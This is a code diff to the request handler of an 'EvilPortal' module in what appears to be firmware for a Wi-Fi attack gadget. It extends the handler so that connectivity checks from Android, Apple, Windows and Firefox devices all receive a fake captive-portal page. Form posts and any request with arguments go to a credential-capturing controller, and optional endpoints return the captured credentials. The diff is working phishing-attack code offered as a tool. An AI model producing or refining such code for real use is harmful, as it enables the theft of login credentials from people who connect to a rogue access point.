@@ -66,14 +66,38 @@ EvilPortal::~EvilPortal() {}
 // ---------------------------------------------------------------------------
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     String url = request->url();
+    url.toLowerCase();
 
-    // Android / Samsung / Chrome probes — MUST be 200 with body
-    if (url == "/generate_204"   || url == "/gen_204" ||
-        url == "/generate204"    || url == "/generate_204/" ||
+    bool isProbe = false;
+
+    // Android / Samsung / Chrome / ChromeOS
+    if (url == "/generate_204" || url == "/gen_204" || url == "/generate204" ||
         url.indexOf("generate_204") != -1 ||
         url.indexOf("connectivitycheck") != -1 ||
-        url.indexOf("clients3.google") != -1) {
+        url.indexOf("clients3.google") != -1 ||
+        url.indexOf("clients4.google") != -1) {
+        isProbe = true;
+    }
+    // Apple
+    else if (url == "/hotspot-detect.html" ||
+             url == "/library/test/success.html" ||
+             url == "/success.html" ||
+             url.indexOf("hotspot-detect") != -1) {
+        isProbe = true;
+    }
+    // Windows
+    else if (url == "/connecttest.txt" || url == "/ncsi.txt" ||
+             url.indexOf("msftconnecttest") != -1 ||
+             url.indexOf("msftncsi") != -1) {
+        isProbe = true;
+    }
+    // Firefox
+    else if (url == "/canonical.html" || url == "/success.txt" ||
+             url.indexOf("detectportal.firefox") != -1) {
+        isProbe = true;
+    }
 
+    if (isProbe) {
         _portal->recordPageView();
         if (_portal->isDefaultHtml)
             request->send(200, "text/html", _portal->htmlPage);
@@ -82,24 +106,17 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         return;
     }
 
-    // iOS / macOS
-    if (url == "/hotspot-detect.html" ||
-        url == "/library/test/success.html" ||
-        url == "/success.html" ||
-        url.indexOf("hotspot-detect") != -1) {
-
-        _portal->recordPageView();
-        if (_portal->isDefaultHtml)
-            request->send(200, "text/html", _portal->htmlPage);
-        else
-            request->send(*_portal->fsHtmlFile, _portal->htmlFileName, "text/html");
+    // Explicit routes
+    if (url == "/" || url == "/index.html") {
+        _portal->portalController(request);
+        return;
+    }
+    if (url == "/post") {
+        _portal->credsController(request);
         return;
     }
 
-    // ... rest of the original handler (with _portal-> everywhere)
-    if (url == "/")          { _portal->portalController(request); return; }
-    if (url == "/post")      { _portal->credsController(request);  return; }
-
+    // Admin endpoints (optional)
     if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
         bruceConfig.evilPortalEndpoints.allowGetCreds) {
         request->send(200, "text/html", _portal->creds_GET());
@@ -117,10 +134,13 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         return;
     }
 
-    // Fallback
-    if (request->args() > 0) _portal->credsController(request);
-    else                     _portal->portalController(request);
+    // CATCH-ALL — critical for PCs and unknown paths
+    if (request->args() > 0)
+        _portal->credsController(request);
+    else
+        _portal->portalController(request);
 }
+
 
 // ---------------------------------------------------------------------------
 // setup()
